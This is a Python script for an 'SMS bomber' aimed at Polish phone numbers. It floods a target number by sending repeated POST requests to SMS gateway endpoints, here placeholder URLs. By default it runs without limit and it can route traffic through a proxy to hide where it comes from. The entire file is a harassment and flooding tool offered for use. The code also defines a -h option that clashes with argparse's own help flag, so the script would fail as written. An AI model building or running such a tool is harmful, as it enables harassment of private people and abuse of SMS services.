import argparse
import requests
import threading
import time
import signal
import sys
import os
from pathlib import Path
from configparser import ConfigParser

# Initialize global variables
sent_count = 0
fail_count = 0
stop_bombing = False

# Signal handler to stop the process
def signal_handler(sig, frame):
    global stop_bombing
    stop_bombing = True
    print("\nProcess interrupted. Generating stats...")
    show_stats()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Helper function to print stats
def show_stats():
    print("\n--- SMS Bombing Stats ---")
    print(f"\033[92mSuccess: {sent_count}\033[0m")
    print(f"\033[91mFailed: {fail_count}\033[0m")

# Load URLs from the database file or script
SMS_GATEWAYS = [
    "https://example.com/api/send_sms",
    "https://example2.com/api/send_sms"
]

CONFIG_FILE_PATH = Path.home() / ".smsbomber" / "sms.conf"

# Read SMS gateway configuration
def load_sms_config():
    config = ConfigParser()
    if CONFIG_FILE_PATH.exists():
        config.read(CONFIG_FILE_PATH)
        return config
    else:
        return None

# Function to send SMS
def send_sms(url, phone, message=None, proxy=None, verbose=False):
    global sent_count, fail_count
    try:
        headers = {"Content-Type": "application/json"}
        payload = {"phone": phone, "message": message} if message else {"phone": phone}
        proxies = {"http": proxy, "https": proxy} if proxy else None

        response = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=10)

        if response.status_code == 200:
            sent_count += 1
            if verbose:
                print(f"\033[92m[Success]\033[0m Sent SMS to {phone} via {url}")
        else:
            fail_count += 1
            if verbose:
                print(f"\033[91m[Failure]\033[0m Failed to send SMS to {phone} via {url}")
    except Exception as e:
        fail_count += 1
        if verbose:
            print(f"\033[91m[Error]\033[0m Exception occurred: {str(e)}")

# Main function to handle bombing
def sms_bomb(phone, n, message, proxy, verbose):
    global stop_bombing

    while not stop_bombing:
        for url in SMS_GATEWAYS:
            if stop_bombing:
                break

            send_sms(url, phone, message, proxy, verbose)

            if n:
                n -= 1
                if n <= 0:
                    stop_bombing = True
                    break

            time.sleep(1)  # Optional delay between requests

# Entry point of the script
def main():
    parser = argparse.ArgumentParser(description="SMS Bomber for Polish phone numbers")
    parser.add_argument("-p", "--phone", required=True, help="Target phone number")
    parser.add_argument("-n", "--number_of_sms", type=int, default=None, help="Number of SMS to send (default: unlimited)")
    parser.add_argument("-m", "--message", type=str, default=None, help="Message content or path to a .txt file with the message")
    parser.add_argument("-x", "--proxy", type=str, default=None, help="Proxy address to use for connections")
    parser.add_argument("-h", "--help", action="store_true", help="Show this help message and exit")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")

    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit(0)

    phone = args.phone
    n = args.number_of_sms
    message = args.message
    proxy = args.proxy
    verbose = args.verbose

    if message and Path(message).is_file():
        with open(message, "r") as file:
            message = file.read()

    if message:
        config = load_sms_config()
        if not config:
            print("\033[91mError:\033[0m SMS gateway configuration not found. Please create ~/.smsbomber/sms.conf")
            sys.exit(1)

        gateway_url = config.get("SMSGateway", "url", fallback=None)
        if not gateway_url:
            print("\033[91mError:\033[0m SMS gateway URL not specified in the config file.")
            sys.exit(1)

        print(f"Sending custom message via {gateway_url}...\nPress Ctrl+C to stop.")
        send_sms(gateway_url, phone, message, proxy, verbose)
    else:
        print("Starting SMS bombing... Press 'Ctrl+C' to stop.")
        sms_bomb(phone, n, message, proxy, verbose)

    show_stats()

if __name__ == "__main__":
    main()
